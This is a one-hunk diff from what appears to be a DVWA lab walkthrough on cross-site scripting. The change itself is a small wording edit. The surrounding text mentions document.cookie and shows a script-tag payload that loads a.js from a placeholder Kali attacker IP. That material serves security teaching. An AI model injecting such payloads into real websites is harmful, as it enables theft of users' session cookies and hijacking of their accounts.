@@ -26,7 +26,7 @@ Interesting. Can we cause an <code>alert</code> popup to occur using this field?
 
 <i>Note that I actually input <code>document.cookie.split(";")[0]</code> as my payload, in order to hide my session ID. Just a privacy thing for me. You don't have to do that, and it impacts nothing besides what you see in my screenshots.</i>
 
-Perfect! Instead of using an <code>alert</code>, let's use our previous exploit/payload combo from <a href="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/Challenge%2010:%20XSS%20(DOM).md" target="_blank">Challenge 10</a>.
+Perfect! Instead of using <code>alert()</code>, let's use our previous exploit/payload combo from <a href="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/Challenge%2010:%20XSS%20(DOM).md" target="_blank">Challenge 10</a>.
 
 <code>&#60;script src="http://[your_Kali_IP]:9999/a.js"&#62;&#60;/script&#62;</code>
 
